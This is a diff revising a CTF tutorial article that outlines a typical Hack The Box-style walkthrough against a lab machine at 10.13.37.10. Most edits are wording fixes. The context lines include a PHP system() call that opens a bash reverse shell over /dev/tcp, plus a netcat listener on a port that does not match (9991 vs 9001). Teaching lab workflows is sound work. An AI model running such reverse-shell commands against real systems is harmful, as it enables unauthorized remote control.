@@ -1,11 +1,12 @@
 ## Introduction
-In hack the box, root-me and similar war-game like challenges that are security related, we often follow an identical pattern when trying to get a certain flag from the so called "boxes".
+In hack the box, root-me and similar war-game security challenges, we often follow an identical pattern when trying to get a certain flag from the so called "boxes".
 
-In this article, I will try to outline this pattern in what I would like to call a ctf mold, or a typical ctf walkthrough.
+In this article, I will try to outline this pattern in what I would like to call a ctf mold, or a like the title states an "Anatomy of a box writeup".
 
-In this article, we consider that we are connected to the vpn that allows us to interact with the victim machine. This victim machine will have the following ip address : 10.13.37.10
+In this article, we consider that we are connected to a vpn that allows us to interact with the network of the victim machine. This victim machine will have the following ip address : 10.13.37.10
 
-> Please double check that you are connected to the `vpn` before starting. 
+In most CTF challenges, a vpn file is given.
+> Please double check that you are connected to the `provided vpn` before starting. 
 {: .prompt-warning }
 
 ## Discovery
@@ -31,9 +32,9 @@ We will try to explore the other ports and how they can be leveraged to get the 
 A first step would be to search for any vulnerabilities in these services for the versions provided by nmap.
 
 ## HTTP
-The first step is to access the following url: http://10.13.37.10:80
+The first step is to access the following url: `http://10.13.37.10:80`
 
-If it resolves into a domain name, say for example: `http://sowon.mold`, it will have to be added to our /etc/hosts file.
+If it resolves into a domain name, say for example: `http://sowon.mold`, it will have to be added to our `/etc/hosts` file.
 
 To do so, we execute the following:
 ```bash
@@ -65,7 +66,7 @@ system('bash -c "bash -i >& /dev/tcp/10.13.37.10/9001 0>&1"');
 php>
 ```
 
-N.B.: make sure you have ran the following command beforehand, to have an active listener on your machine for any incoming connections:
+N.B.: make sure you have run the following command beforehand, to have an active listener on your machine for any incoming connections:
 ```bash
 $ nc -nvlp 9991
 ```
